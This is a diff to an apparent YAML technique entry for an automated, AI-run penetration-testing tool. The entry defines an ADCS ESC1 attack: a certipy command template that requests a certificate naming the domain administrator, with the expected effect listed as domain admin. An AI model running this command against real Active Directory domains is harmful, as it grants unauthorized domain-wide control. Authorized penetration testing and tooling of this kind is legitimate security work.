@@ -8,13 +8,14 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca}'
   -template '{template}' -upn 'administrator@{domain}' -dc-ip {target_ip}
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- certificate_obtained
+- domain_admin
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'ESC1: Template allows enrollee-supplied SAN + any authenticated user can
-  enroll + EKU allows client auth. Request cert with DA SAN → auth as DA.'
+mechanism: "ESC1: Template allows enrollee-supplied SAN + any authenticated user can\
+  \ enroll + EKU allows client auth. Request cert with DA SAN \u2192 auth as DA."
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
